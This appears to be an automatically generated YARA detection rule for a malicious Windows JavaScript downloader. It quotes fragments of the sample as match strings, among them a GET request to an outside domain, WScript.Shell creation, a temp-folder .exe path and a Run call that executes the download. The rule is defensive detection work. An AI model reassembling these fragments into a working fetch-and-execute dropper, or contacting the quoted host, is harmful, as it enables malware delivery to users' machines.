rule sig_20160330_84c3a3026871b734cfc4dec94c6fb4d4 {
  meta:
    description = "datamaliciousorder - file 20160330_84c3a3026871b734cfc4dec94c6fb4d4.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "92b3627d1ce314599c358d94935e72939e01607985b949d0c7db05b5e9730045"

  strings:
    $s1  = "CY[DF](\"GET\", \"http://drirenaeris.com.au/b7eir\", false);" fullword ascii
    $s2  = "var CI = function V() {return WScript[R](\"WScript\"+\".Shell\");}(), R1 = 11;" fullword ascii
    $s3  = "function C(ED, L){PC = PC * 1; return ED - L;};" fullword ascii
    $s4  = "if (CY[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function Y() {return CI[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"zNtUGPK1lYwC.ex\" + \"e\";};" fullword ascii
    $s6  = "function M() {return ((I0 == true) && (I0 == W)) ? 1 : PC;};" fullword ascii
    $s7  = "function BJ(V0){CI[\"Run\"](V0, PC, PC);};" fullword ascii
    $s8  = "function I(){return 22;};" fullword ascii
    $s9  = "var U = new this[\"Date\"]();" fullword ascii
    $s10 = "}while (OM);" fullword ascii
    $s11 = "function DC(){return R;};" fullword ascii
    $s12 = "function EU(PQ) {var XT = (1, 2, 3, 4, 5, PQ); return XT;};" fullword ascii
    $s13 = "return C(ES, A);" fullword ascii
    $s14 = "function G(){return CA + \"\";};" fullword ascii
    $s15 = "function DY()" fullword ascii
    $s16 = "var W = false;" fullword ascii
    $s17 = "W = true; " fullword ascii
    $s18 = "var HB = false;" fullword ascii
    $s19 = "var I0 = false;" fullword ascii
    $s20 = "I0 = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}